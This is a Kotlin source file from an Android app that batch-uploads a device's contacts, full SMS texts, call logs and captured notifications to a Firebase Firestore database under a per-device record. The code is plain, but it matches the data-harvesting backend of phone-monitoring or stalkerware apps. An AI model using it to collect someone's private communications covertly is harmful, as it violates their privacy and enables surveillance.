package com.boxx.datasync.data.repository

import android.util.Log
import com.boxx.datasync.domain.model.*
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import java.security.MessageDigest
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirestoreRepository @Inject constructor() {
    private val db = FirebaseFirestore.getInstance()
    private val crashlytics = FirebaseCrashlytics.getInstance()

    suspend fun updateDeviceInfo(device: Device) {
        try {
            db.collection("devices")
                .document(device.deviceId)
                .set(device)
                .await()
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error updating device info", e)
            crashlytics.recordException(e)
        }
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        syncCollection(deviceId, "contacts", contacts) { hashString(it.phone) }
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        syncCollection(deviceId, "sms", smsList) { hashString("${it.address}${it.date}${it.body}") }
    }

    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
        syncCollection(deviceId, "calllogs", callLogs) { hashString("${it.number}${it.date}${it.type}") }
    }

    suspend fun syncNotification(deviceId: String, notification: NotificationData) {
        if (deviceId.isBlank()) return
        try {
            val docId = hashString("${notification.packageName}${notification.timestamp}${notification.title}")
            db.collection("devices")
                .document(deviceId)
                .collection("notifications")
                .document(docId)
                .set(notification)
                .await()
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error syncing notification", e)
            crashlytics.recordException(e)
        }
    }

    private suspend fun <T : Any> syncCollection(
        deviceId: String,
        collectionName: String,
        data: List<T>,
        idSelector: (T) -> String
    ) {
        if (deviceId.isBlank()) return
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection(collectionName)

        try {
            val chunks = data.chunked(500)
            for (chunk in chunks) {
                val batch = db.batch()
                chunk.forEach { item ->
                    val docId = idSelector(item)
                    val docRef = collectionRef.document(docId)
                    batch.set(docRef, item)
                }
                batch.commit().await()
            }
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error syncing $collectionName", e)
            crashlytics.recordException(e)
        }
    }

    private fun hashString(input: String): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(input.toByteArray())
            .joinToString("") { "%02x".format(it) }
    }
}
